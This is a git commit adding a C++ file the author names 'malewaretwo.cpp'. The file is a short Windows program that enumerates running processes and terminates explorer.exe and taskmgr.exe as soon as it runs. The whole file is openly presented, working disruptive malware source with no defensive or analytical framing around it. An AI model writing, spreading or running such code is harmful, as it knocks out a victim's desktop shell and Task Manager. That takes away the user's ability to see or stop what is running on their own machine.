f7cfffb1ed345600ef7bfde01974c566fde4ddb7
Nucax <louisthevis84@gmail.com>
2025-09-15 22:10:20 +0200

    Create malewaretwo.cpp

---
+++ nucaxem/c++/malewaretwo.cpp
@@ -0,0 +1,38 @@
+#include <windows.h>
+#include <tlhelp32.h>
+
+bool terminateProcessByName(const std::wstring& processName) {
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) {
+        return false;
+    }
+
+    PROCESSENTRY32W pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32W);
+
+    if (!Process32FirstW(hSnapshot, &pe32)) {
+        CloseHandle(hSnapshot);
+        return false;
+    }
+
+    bool found = false;
+    do {
+        if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
+            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
+            if (hProcess != NULL) {
+                TerminateProcess(hProcess, 0);
+                CloseHandle(hProcess);
+                found = true;
+            }
+        }
+    } while (Process32NextW(hSnapshot, &pe32));
+
+    CloseHandle(hSnapshot);
+    return found;
+}
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    terminateProcessByName(L"explorer.exe");
+    terminateProcessByName(L"taskmgr.exe");
+    return 0;
+}
